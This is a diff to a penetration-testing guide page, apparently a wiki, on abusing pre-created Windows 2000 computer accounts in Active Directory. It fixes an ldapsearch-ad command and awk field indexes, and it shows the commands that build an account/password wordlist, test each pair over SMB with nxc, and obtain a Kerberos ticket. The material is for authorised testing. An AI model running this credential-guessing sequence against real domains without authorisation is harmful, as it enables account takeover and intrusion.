@@ -25,13 +25,13 @@ The [ldapsearch-ad](https://github.com/yaap7/ldapsearch-ad) tool can be used to 
 
 ```powershell
 # 1. find pre-created accounts that never logged on
-ldapsearch-ad -l $LDAP_SERVER -d $DOMAIN -u $USERNAME -p $PASSWORD -t search -s '(&(userAccountControl=4128)(logonCount=0))' | tee results.txt
+ldapsearch-ad.py -l $LDAP_SERVER -d $DOMAIN -u $USERNAME -p $PASSWORD -t search -s '(&(userAccountControl=4128)(logonCount=0))' | tee results.txt
 
 # 2. extract the sAMAccountNames of the results
-cat results.txt | grep "sAMAccountName" | awk '{print $4}' | tee computers.txt
+cat results.txt | grep "sAMAccountName" | awk '{print $5}' | tee computers.txt
 
 # 3. create a wordlist of passwords matching the Pre-Windows 2000 generation, based on the account names
-cat results.txt | grep "sAMAccountName" | awk '{print tolower($4)}' | tr -d '$' | tee passwords.txt
+cat results.txt | grep "sAMAccountName" | awk '{print tolower($5)}' | tr -d '$' | tee passwords.txt
 
 # 4. bruteforce, line per line (user1:password1, user2:password2, ...)
 nxc smb $DC_IP -u "computers.txt" -p "passwords.txt" --no-bruteforce
@@ -49,7 +49,7 @@ Testers can then change the Pre-Windows 2000 computer accounts' password (i.e. [
 > getTGT.py $DOMAIN/$COMPUTER_NAME\$:$COMPUTER_PASSWORD
 > ```
 > 
-> The ticket obtained can then be used with [ptt.md](../kerberos/ptt.md)
+> The ticket obtained can then be used with [Pass the ticket](../kerberos/ptt.md)
 
 ## Resources
 
